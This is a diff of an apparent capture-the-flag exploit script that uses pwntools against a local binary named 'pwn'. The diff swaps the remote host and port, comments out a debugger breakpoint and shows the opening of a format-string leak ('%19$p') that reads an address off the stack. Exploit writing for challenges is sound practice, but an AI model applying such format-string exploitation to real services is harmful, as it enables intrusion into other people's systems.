@@ -6,15 +6,15 @@ libc = ELF('./libc.so.6')
 elf = ELF('./pwn')
 flag = 0
 if flag:
-    r = remote('10.253.55.103', 4276)
+    r = remote('10.253.37.132', 2604)
 else:
     r = process("./pwn")
 
 def lg(buf):
     log.success(f'\033[33m{buf}:{eval(buf):#x}\033[0m')
 
-gdb.attach(r, 'b *0x40132A')
-pause()
+'''gdb.attach(r, 'b *0x40132A')
+pause()'''
 
 r.sendlineafter(b': \n', b'%19$p')
 r.recvuntil(b'0x')
